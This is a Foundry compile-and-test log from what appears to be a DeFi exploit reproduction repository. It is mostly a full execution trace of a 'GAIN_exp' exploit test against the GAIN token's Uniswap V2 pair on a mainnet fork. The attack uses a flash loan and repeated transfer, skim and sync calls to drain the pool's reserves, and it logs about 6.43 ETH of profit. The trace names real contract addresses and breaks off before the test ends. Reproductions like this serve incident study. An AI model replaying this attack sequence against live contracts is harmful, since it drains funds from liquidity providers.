Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.22s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-02/GAIN_exp.sol:16:5:
   |
16 |     IWETH WETH = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    в”њв”Ђ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 242.02ms (570.18Вµs CPU time)

Ran 1 test for src/test/2024-02/GAIN_exp.sol:ContractTest
[PASS] testExploit() (gas: 554200)
Logs:
  Before Start: 0 ETH
  Attack Exploit: 6.432936950955627431 ETH

Traces:
  [652300] ContractTest::testExploit()
    в”њв”Ђ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ [0] console::log("Before Start: %d ETH", 0) [staticcall]
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [630322] Uniswap V3: USDT::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000 [1e17], 0, 0x)
    в”‚   в”њв”Ђ [2534] WETH::balanceOf(Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 775273133927997686533 [7.752e20]
    в”‚   в”њв”Ђ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 3033512964845 [3.033e12]
    в”‚   в”њв”Ђ [25962] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000 [1e17])
    в”‚   в”‚   в”њв”Ђ emit Transfer(from: Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100000000000000000 [1e17])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [570541] ContractTest::uniswapV3FlashCallback(10000000000000 [1e13], 0, 0x)
    в”‚   в”‚   в”њв”Ђ [8062] WETH::transfer(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], 100000000000000000 [1e17])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], value: 100000000000000000 [1e17])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [134087] Uniswap V2: GAIN::swap(0, 100000 [1e5], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    в”‚   в”‚   в”‚   в”њв”Ђ [90862] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000 [1e5])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100000 [1e5])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6598936314221857031 [6.598e18]
    в”‚   в”‚   в”‚   в”њв”Ђ [6868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 180049177796806821424078518 [1.8e26]
    в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 6598936314221857031 [6.598e18], reserve1: 180049177796806821424078518 [1.8e26])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 100000000000000000 [1e17], amount1In: 0, amount0Out: 0, amount1Out: 100000 [1e5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [55185] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transfer(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], 100)
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, value: 15)
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], value: 84)
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [24153] Uniswap V2: GAIN::skim(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”њв”Ђ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6598936314221857031 [6.598e18]
    в”‚   в”‚   в”‚   в”њв”Ђ [3262] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 180049177796879123627905105 [1.8e26]
    в”‚   в”‚   в”‚   в”њв”Ђ [10630] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 72302203826587 [7.23e13])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 72302203826587 [7.23e13])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [9920] Uniswap V2: GAIN::sync()
    в”‚   в”‚   в”‚   в”њв”Ђ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6598936314221857031 [6.598e18]
    в”‚   в”‚   в”‚   в”њв”Ђ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 117815741151863270524560753 [1.178e26]
    в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 6598936314221857031 [6.598e18], reserve1: 117815741151863270524560753 [1.178e26])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [133283] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transfer(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], 188)
    в”‚   в”‚   в”‚   в”њв”Ђ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::WETH() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
    в”‚   в”‚   в”‚   в”њв”Ђ [78675] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForETHSupportingFeeOnTransferTokens(10, 0, [0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, 1708537751 [1.708e9])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [10633] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transferFrom(0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], 10)
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [504] Uniswap V2: GAIN::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6598936314221857031 [6.598e18], 117815741151863270524560753 [1.178e26], 1708537751 [1.708e9]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 117815741151871877929778204 [1.178e26]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [40671] Uniswap V2: GAIN::swap(480660 [4.806e5], 0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 0x)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [25162] WETH::transfer(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 480660 [4.806e5])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 480660 [4.806e5])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6598936314221376371 [6.598e18]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 117815741151871877929778204 [1.178e26]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 6598936314221376371 [6.598e18], reserve1: 117815741151871877929778204 [1.178e26])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount0In: 0, amount1In: 8607405217451 [8.607e12], amount0Out: 480660 [4.806e5], amount1Out: 0, to: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] WETH::balanceOf(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 480660 [4.806e5]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9223] WETH::withdraw(480660 [4.806e5])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [83] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::fallback{value: 480660}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Withdrawal(src: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, wad: 480660 [4.806e5])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [55] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::fallback{value: 480660}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [0] 0x9F3ca923C65738B3F85Dc4de1b5163E178bf2E16::fallback{value: 160220}()
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [0] 0x7B6F62aF8641EC14Fc763b4F3fD5035D49C7DB91::fallback{value: 320440}()
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, value: 30)
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], value: 157)
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [24153] Uniswap V2: GAIN::skim(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”њв”Ђ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6598936314221376371 [6.598e18]
    в”‚   в”‚   в”‚   в”њв”Ђ [3262] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 117815741152007806072972188 [1.178e26]
    в”‚   в”‚   в”‚   в”њв”Ђ [10630] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 135928143193984 [1.359e14])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 135928143193984 [1.359e14])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [9920] Uniswap V2: GAIN::sync()
    в”‚   в”‚   в”‚   в”њв”Ђ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6598936314221376371 [6.598e18]
    в”‚   в”‚   в”‚   в”њв”Ђ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 816880259377623512855239 [8.168e23]
    в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 6598936314221376371 [6.598e18], reserve1: 816880259377623512855239 [8.168e23])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [113783] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transfer(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], 130000000000000 [1.3e14])
    в”‚   в”‚   в”‚   в”њв”Ђ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::WETH() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
    в”‚   в”‚   в”‚   в”њв”Ђ [72675] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForETHSupportingFeeOnTransferTokens(18, 0, [0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, 1708537751 [1.708e9])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6633] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transferFrom(0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], 18)
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [504] Uniswap V2: GAIN::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6598936314221376371 [6.598e18], 816880259377623512855239 [8.168e23], 1708537751 [1.708e9]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 816880259393116842246651 [8.168e23]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [38671] Uniswap V2: GAIN::swap(124783007 [1.247e8], 0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 0x)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [23162] WETH::transfer(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 124783007 [1.247e8])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 124783007 [1.247e8])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6598936314096593364 [6.598e18]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 816880259393116842246651 [8.168e23]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 6598936314096593364 [6.598e18], reserve1: 816880259393116842246651 [8.168e23])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount0In: 0, amount1In: 15493329391412 [1.549e13], amount0Out: 124783007 [1.247e8], amount1Out: 0, to: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] WETH::balanceOf(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 124783007 [1.247e8]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9223] WETH::withdraw(124783007 [1.247e8])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [83] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::fallback{value: 124783007}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Withdrawal(src: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, wad: 124783007 [1.247e8])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [55] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::fallback{value: 124783007}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [0] 0x9F3ca923C65738B3F85Dc4de1b5163E178bf2E16::fallback{value: 41594335}()
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [0] 0x7B6F62aF8641EC14Fc763b4F3fD5035D49C7DB91::fallback{value: 83188671}()
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, value: 20800000000000 [2.08e13])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], value: 109200000000000 [1.092e14])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6598936314096593364 [6.598e18]
    в”‚   в”‚   в”њв”Ђ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6598936314096593364 [6.598e18]
    в”‚   в”‚   в”њв”Ђ [38671] Uniswap V2: GAIN::swap(6532946950955627431 [6.532e18], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    в”‚   в”‚   в”‚   в”њв”Ђ [23162] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6532946950955627431 [6.532e18])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 6532946950955627431 [6.532e18])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 65989363140965933 [6.598e16]
    в”‚   в”‚   в”‚   в”њв”Ђ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 94809745233956213877561280 [9.48e25]
    в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 65989363140965933 [6.598e16], reserve1: 94809745233956213877561280 [9.48e25])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 93992864974563097035314629 [9.399e25], amount0Out: 6532946950955627431 [6.532e18], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [3262] WETH::transfer(Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b], 100010000000000000 [1e17])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b], value: 100010000000000000 [1e17])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [534] WETH::balanceOf(Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b]) [staticcall]
